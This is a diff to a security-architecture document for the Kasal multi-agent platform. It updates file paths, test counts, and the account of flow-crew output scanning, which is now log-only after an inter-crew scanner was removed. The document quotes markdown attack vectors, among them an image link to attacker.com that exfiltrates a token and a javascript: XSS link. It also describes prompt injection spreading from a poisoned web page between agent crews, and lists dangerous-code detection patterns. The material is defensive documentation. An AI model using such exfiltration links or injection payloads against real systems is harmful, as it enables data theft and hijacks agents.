@@ -38,7 +38,7 @@ KASAL SECURITY ARCHITECTURE
       v
   Layer 2: CREW ASSEMBLY CHECKS
     crew_preparation.py (regular crews)
-    flow_methods.py plus flow_builder.py (flow crews)
+    flow_methods.py plus route_listener.py (flow crews)
 
     ALL crew types (starting-point, listener, router)
     go through the same shared run_crew_security_checks()
@@ -80,10 +80,10 @@ KASAL SECURITY ARCHITECTURE
       SHA-256 LRU cache (128 entries)                       Always-on [Area 15]
       | crew output / flow boundary
       v
-  Layer 6: FLOW TRUST BOUNDARY (flow_state.py)              Always-on [Area 10]
-    Scan inter-crew output before passing to next crew
-    Prevents injection propagation through multi-crew
-      flows (attacker-poisoned Crew A to Crew B)
+  Layer 6: FLOW CREW OUTPUT SCANNING (execution_callback.py) Always-on, log-only [Area 10]
+    Each flow crew's task output is scanned by task_callback
+    (injection plus secret leak, secrets redacted) as it
+      completes; not a blocking gate between crews
       | output rendered in frontend
       v
   Layer 7: FRONTEND RENDERING HARDENING
@@ -106,7 +106,7 @@ KASAL SECURITY ARCHITECTURE
 | Decision | Rationale |
 |----------|-----------|
 | All scanning layers are log-only (fail-open) | False positives in blocking mode would halt legitimate crew execution. Detection feeds audit logs; LLM guardrails are the opt-in blocking tier. |
-| Spotlighting at crew assembly (not tool class) | Tools are wrapped once at Crew build time, with zero change to tool implementations and no risk of breaking tool logic. Applies to all crew types: regular crews via `CrewPreparation`, flow starting-point/listener/router crews via `flow_methods.py` and `flow_builder.py`. |
+| Spotlighting at crew assembly (not tool class) | Tools are wrapped once at Crew build time, with zero change to tool implementations and no risk of breaking tool logic. Applies to all crew types: regular crews via `CrewPreparation`, flow starting-point/listener/router crews via `flow_methods.py` and `modules/route_listener.py`. |
 | Per-task trifecta check in addition to per-crew | A crew-wide trifecta can be benign (different tasks, never combined). A single task combining _U plus _S tools in one ReAct loop is the real risk. |
 | LLM guardrails opt-in, not always-on | LLM calls add latency and cost. Users enable guardrails only on tasks where external/untrusted input reaches the agent. |
 | `object.__setattr__` to wrap Pydantic tool lists | CrewAI agents are Pydantic models, so direct attribute assignment is blocked. `object.__setattr__` bypasses Pydantic validation to patch `tools` in-place post-creation. |
@@ -127,9 +127,9 @@ KASAL SECURITY ARCHITECTURE
 | 7 | HTTP Security Headers | Always-on | Implemented | `SecurityHeadersMiddleware` in `main.py` |
 | 8 | Lethal-Trifecta Detection (crew-wide plus per-task) | Always-on | Implemented | `security/tool_capability_manifest.py` plus `crew_preparation.py` |
 | 9 | Secret Leak Detection | Always-on | Implemented | `security/secret_leak_detector.py` |
-| 10 | Flow Trust Boundary Scanning | Always-on | Implemented | `flow/modules/flow_state.py` |
-| 11 | Memory Poisoning Defense | Always-on | Implemented | `callbacks/execution_callback.py` (task_callback) |
-| 12 | Tool Output Scanning | Always-on | Implemented | `callbacks/execution_callback.py` (step_callback) |
+| 10 | Flow Crew Output Scanning | Always-on | Partial (log-only; dedicated inter-crew scanner removed) | `services/execution/kernel/execution_callback.py` (task_callback) |
+| 11 | Memory Poisoning Defense | Always-on | Implemented | `services/execution/kernel/execution_callback.py` (task_callback) |
+| 12 | Tool Output Scanning | Always-on | Implemented | `services/execution/kernel/execution_callback.py` (step_callback) |
 | 13 | Excessive Agency Detection | Always-on | Implemented | `security/tool_capability_manifest.py` plus `crew_preparation.py` |
 | 14 | Unified Security Scanner Pipeline | Always-on | Implemented | `security/scanner_pipeline.py` |
 | 15 | LLM Guardrail Result Caching | Always-on | Implemented | `guardrails/core/llm_injection_guardrail.py`, `core/self_reflection_guardrail.py` |
@@ -368,7 +368,7 @@ An opt-in `SelfReflectionGuardrail` (type `"self_reflection"`) uses an LLM to co
 **Document says:**
 > The conversion of LLM output to HTML must be handled carefully. Key attack vectors: `![img](https://attacker.com/exfil?token=X)` (data exfiltration via GET), `[text](javascript:alert())` (XSS), phishing links, and inline `<script>` tags. Recommended hardened react-markdown config: `disallowedElements`, URL sanitization blocking `javascript:` / `data:` / `vbscript:`, `rehypeSanitize`, `rehypeRaw`.
 
-**Kasal implementation:** `src/frontend/src/components/Chat/components/MessageRenderer.tsx` and `src/frontend/src/components/Jobs/ShowResult.tsx`
+**Kasal implementation:** `src/frontend/src/features/workflow/assistant/components/MessageRenderer.tsx` and `src/frontend/src/features/executions/components/ShowResult.tsx`
 
 ```typescript
 // URL sanitizer: blocks dangerous schemes
@@ -409,7 +409,7 @@ function sanitizeUrl(uri?: string | null): string {
 **Document says:**
 > HTML preview iframes must be hardened. External image loads can leak data via GET requests. Forms can submit data externally. The sandbox attribute and CSP restrict what the embedded document can do.
 
-**Kasal implementation:** `src/frontend/src/components/Jobs/ShowResult.tsx`
+**Kasal implementation:** `src/frontend/src/features/executions/components/ShowResult.tsx`
 
 ```typescript
 // Tightened sandbox: removed allow-forms, allow-popups, allow-downloads
@@ -546,11 +546,14 @@ A `SecretLeakDetector` scans all agent outputs for accidentally leaked credentia
 
 **Kasal implementation, two layers:**
 
-**Layer A, inter-crew output scanning:** `src/backend/src/services/flow_builder/modules/flow_state.py`
+**Layer A, flow crew output scanning:** `src/backend/src/services/execution/kernel/execution_callback.py`
 
-In `FlowStateManager.parse_crew_output()`, the output of a completed crew is scanned via `security_scanner.scan()` **before** it is passed to the next crew in a flow. This is a trust boundary: one crew's output is the next crew's input.
+Flow crews get the same `step_callback` and `task_callback` as regular crews (`create_execution_callbacks()`, wired in `modules/flow_methods.py` and `modules/route_listener.py`). The task callback runs `security_scanner.scan()` on every task output as it completes and redacts leaked secrets before the output is logged, streamed or persisted. This is log-only: it records findings but does not stop one crew's output from reaching the next crew.
 
-**Layer B, assembly-time checks on all flow crew types:** `flow_methods.py`, `flow_builder.py`
+> [!NOTE]
+> Earlier revisions had a dedicated inter-crew scanner, `FlowStateManager.parse_crew_output()`, that scanned a crew's output before handing it to the next crew. That module and its security tests were removed as unused code in commit `e4f63e05`, so there is no separate trust-boundary scan today. Enable the opt-in LLM injection guardrail (Area 3) on downstream tasks if you need a blocking check.
+
+**Layer B, assembly-time checks on all flow crew types:** `modules/flow_methods.py`, `modules/route_listener.py`
 
 Flow crews bypass `CrewPreparation`; they build their `Crew` objects directly. All three flow crew types now call the shared `run_crew_security_checks()` function from `tool_capability_manifest.py` immediately after the Crew is created:
 
@@ -558,15 +561,15 @@ Flow crews bypass `CrewPreparation`; they build their `Crew` objects directly. A
 |---|---|---|
 | Starting-point crew | `flow_methods.py` | Spotlighting, trifecta, mixed-task, destructive |
 | Listener crew | `flow_methods.py` | Spotlighting, trifecta, mixed-task, destructive |
-| Router crew | `flow_builder.py` | Spotlighting, trifecta, mixed-task, destructive |
+| Router crew | `route_listener.py` | Spotlighting, trifecta, mixed-task, destructive |
 
 This means **flows and regular crews now have identical assembly-time security coverage**. The `run_crew_security_checks()` function is the single shared implementation used by all four paths (1 regular plus 3 flow).
 
-**Rationale:** In multi-crew flows, a compromised crew (e.g., one that ingested a poisoned web page) could produce output containing injection payloads. Layer A catches payloads crossing crew boundaries. Layer B ensures each crew's tool configuration is checked for trifecta/mixed-task risks before it ever runs.
+**Rationale:** In multi-crew flows, a compromised crew (e.g., one that ingested a poisoned web page) could produce output containing injection payloads. Layer A records and redacts payloads in each crew's output. Layer B ensures each crew's tool configuration is checked for trifecta/mixed-task risks before it ever runs.
 
 **Coverage vs document:**
 - Goes beyond document (addresses multi-agent flow-specific risk)
-- Layer A: scans for injection patterns and leaked secrets at flow boundaries
+- Layer A: scans each flow crew's task output for injection patterns and leaked secrets (log-only, with secret redaction)
 - Layer B: spotlighting plus trifecta plus mixed-task on all three flow crew types
 - Both layers non-blocking: findings are logged, execution continues
 - Single shared implementation: no risk of flow path diverging from crew path
@@ -624,7 +627,7 @@ A new `PERFORMS_DESTRUCTIVE_OPERATIONS` capability flag is added to the tool man
 
 **Kasal implementation:** `src/backend/src/services/security/scanner_pipeline.py`
 
-A `SecurityScannerPipeline` singleton replaces scattered inline detector instantiation. All scan call sites (`execution_runner.py`, `execution_callback.py`, `flow_state.py`) now use `security_scanner.scan()` which runs both injection detection and secret leak detection in a single call with consistent audit logging.
+A `SecurityScannerPipeline` singleton replaces scattered inline detector instantiation. All scan call sites (`execution_runner.py`, `execution_callback.py`, `memory/run/write_hygiene.py` and two Power BI tools) use `security_scanner.scan()` which runs both injection detection and secret leak detection in a single call with consistent audit logging.
 
 **Benefits:**
 - Single shared detector instances (no repeated object creation)
@@ -682,6 +685,8 @@ Four MEDIUM-severity regex patterns were tightened to reduce false positives on 
 > The agent should only have access to resources that the user initiating the request is already authorized to view. Use the "On Behalf Of" (OBO) user authorization offered for Databricks Apps.
 
 **Kasal:** OBO authentication is implemented for all Databricks resource access (Unity Catalog, Vector Search, Genie). Agents operate within the authorisation scope of the user's token, not elevated service principal credentials.
+
+OBO is only as strong as the identity it is keyed to. Inside Databricks Apps, Kasal trusts only the `X-Forwarded-Email`, `X-Forwarded-User` and `X-Forwarded-Access-Token` headers the platform proxy sets; client-supplied `X-Auth-Request-*` headers are stripped before any handler sees them, and every API route that depends on `get_group_context` fails closed with `401` when no identity is present. For the full rules, see [identity and request authentication](./SECURITY.md#identity-and-request-authentication).
 
 ---
 
@@ -870,7 +875,7 @@ Code generation introduces a qualitatively different risk profile compared to te
 The current `LLMInjectionGuardrail` classifies text output as SAFE/INJECTION. It was not designed to evaluate Python code. A dedicated `CodeSafetyGuardrail` would statically analyse generated code for dangerous patterns before it is handed off for execution or deployment: outbound network calls (`requests`, `urllib`, `http.client`), subprocess/shell execution (`subprocess`, `os.system`, `eval`, `exec`), credential exfiltration to disk or logs, and suspicious import patterns. New guardrail type string: `"code_safety_check"`. Should be a **hard gate** (not fail-open) when `allow_code_execution` is enabled on the agent.
 
 **`allow_code_execution` policy enforcement**
-CrewAI's `allow_code_execution: true` runs a Python subprocess on agent-generated code with no sandbox; the agent's permissions are the process's permissions. This must either be disabled by default (rejected in `kernel/agent_security.py` or `paths/crew/crew_preparation.py` with a clear error), or gated behind the `code_safety_check` guardrail as a blocking (not fail-open) check before execution proceeds.
+CrewAI's `allow_code_execution: true` runs a Python subprocess on agent-generated code with no sandbox; the agent's permissions are the process's permissions. This must either be disabled by default (rejected in `services/execution/kernel/agent_security.py` or `services/agent_builder/crew_preparation.py` with a clear error), or gated behind the `code_safety_check` guardrail as a blocking (not fail-open) check before execution proceeds.
 
 **GitHub / code tools in the trifecta manifest**
 Any new tools for GitHub repo ingestion or code execution must be added to `tool_capability_manifest.py` with the correct capability flags:
@@ -905,33 +910,31 @@ Embed a secret token in the system prompt that the LLM must echo at a fixed posi
 
 ## Test evidence files
 
-All automated tests pass as of Mar 8, 2026:
+Test counts below are the number of test functions in each file at the time of the last docs refresh; run the command to get the current result.
 
 | Test File | Tests | Area |
 |-----------|-------|------|
 | `tests/unit/test_security_headers_middleware.py` | 11 | Area 7 |
-| `tests/unit/services/execution/kernel/test_agent_helpers_security.py` | 17 | Area 1 |
+| `tests/unit/services/execution/kernel/test_agent_helpers_security.py` | 25 | Area 1 |
 | `tests/unit/services/security/test_prompt_injection_detector.py` | 45 | Area 2, 16 |
-| `tests/unit/services/security/test_tool_capability_manifest.py` | 22 | Area 8 |
-| `tests/unit/services/security/test_tool_capability_manifest_destructive.py` | 16 | Area 13 |
-| `tests/unit/services/security/test_secret_leak_detector.py` | 36 | Area 9 |
-| `tests/unit/services/security/test_scanner_pipeline.py` | 22 | Area 14 |
-| `tests/unit/services/guardrails/test_llm_injection_guardrail.py` | 15 | Area 3 |
-| `tests/unit/services/guardrails/test_self_reflection_guardrail.py` | 20 | Area 4 |
-| `tests/unit/services/guardrails/test_guardrail_caching.py` | 13 | Area 15 |
-| `tests/unit/services/flow_builder/test_flow_state_security.py` | 12 | Area 10 |
-| `src/frontend/src/components/Chat/components/MessageRenderer.test.tsx` | 23 (security block) | Area 5 |
-| **Total** | **252** | |
+| `tests/unit/services/security/test_tool_capability_manifest.py` | 44 | Area 8 |
+| `tests/unit/services/security/test_tool_capability_manifest_destructive.py` | 15 | Area 13 |
+| `tests/unit/services/security/test_secret_leak_detector.py` | 45 | Area 9 |
+| `tests/unit/services/security/test_scanner_pipeline.py` | 28 | Area 14 |
+| `tests/unit/services/guardrails/test_llm_injection_guardrail.py` | 17 | Area 3 |
+| `tests/unit/services/guardrails/test_self_reflection_guardrail.py` | 18 | Area 4 |
+| `tests/unit/services/guardrails/test_guardrail_caching.py` | 11 | Area 15 |
+| `src/frontend/src/features/workflow/assistant/components/MessageRenderer.test.tsx` | 18 (security hardening block) | Area 5 |
+| **Total** | **277** | |
 
 Run all security tests:
 ```bash
 cd src/backend
-python -m pytest \
+uv run python -m pytest \
   tests/unit/test_security_headers_middleware.py \
   tests/unit/services/execution/kernel/test_agent_helpers_security.py \
   tests/unit/services/security/ \
   tests/unit/services/guardrails/ \
-  tests/unit/services/flow_builder/test_flow_state_security.py \
   -v
 ```
 
